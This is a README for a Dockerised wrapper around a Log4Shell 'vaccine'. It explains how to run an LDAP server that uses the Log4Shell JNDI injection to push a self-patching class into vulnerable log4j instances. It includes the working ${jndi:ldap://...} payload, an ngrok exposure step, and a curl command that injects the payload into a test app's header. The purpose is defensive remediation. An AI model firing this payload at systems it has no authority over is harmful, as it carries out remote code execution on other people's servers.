## Log4j Docker Vaccine

A containerized way to run the log4j vaccine offered by Cyberreason

- https://github.com/Cybereason/Logout4Shell

### Make it go
Clone this repo:

```bash
git clone https://github.com/jeffbryner/log4j-docker-vaccine.git
```

Edit the containers.env file to hold an accurate private or public IP/DNS that your target can access. The default entry likely won't work for you!

Build and run the containers:

```bash
docker-compose -f docker-compose.yml -p vaccine up
```

You now have a listening ldap server that will serve up the Log4jRCE class to innoculate a vulnerable log4j instance.

You can expose this to the internet (if you like) by using ngrok.
 - https://dashboard.ngrok.com/get-started/setup

 ```bash
 ngrok tcp 1389
 ```

 You can send a vulnerable log4j instance to this using the infamous jndi input string:
 ```
 ${jndi:ldap://<ngrokurlgoeshere>:1389/a}
 ```

## Testing
There is a purposefully vulnerable version of log4j in a container available at:
- https://github.com/christophetd/log4shell-vulnerable-app

You can follow their instructions to start it and use it for testing:

```
docker build . -t vulnerable-app
docker run -p 8080:8080 --name vulnerable-app vulnerable-app
```

And trigger the innoculation via:
```
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://your-ip-address-or-dns-name:1389/a'
```
